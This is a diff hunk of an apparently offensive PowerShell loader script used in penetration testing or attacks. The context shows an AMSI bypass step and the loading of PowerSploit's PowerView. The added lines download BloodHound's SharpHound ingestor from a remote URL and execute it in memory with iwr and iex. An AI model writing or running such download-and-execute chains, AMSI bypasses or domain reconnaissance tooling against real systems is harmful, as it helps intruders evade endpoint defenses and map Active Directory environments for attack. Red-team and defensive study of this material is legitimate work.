@@ -124,6 +124,14 @@ if (!($languagemode -match "constrained")) {
         echo "Failed to bypass AMSI"
     }
 
+    # BloodHound
+    $iex ($iwr $url/BloodHound/Ingestors/SharpHound.ps1)
+    if (\$?) {
+        echo "Imported BloodHound"
+    } else {
+        echo "Failed to import BloodHound"
+    }
+
     # PowerView and PowerUp
     $iex ($iwr $url/PowerSploit/Recon/PowerView.ps1)
     if (\$?) {
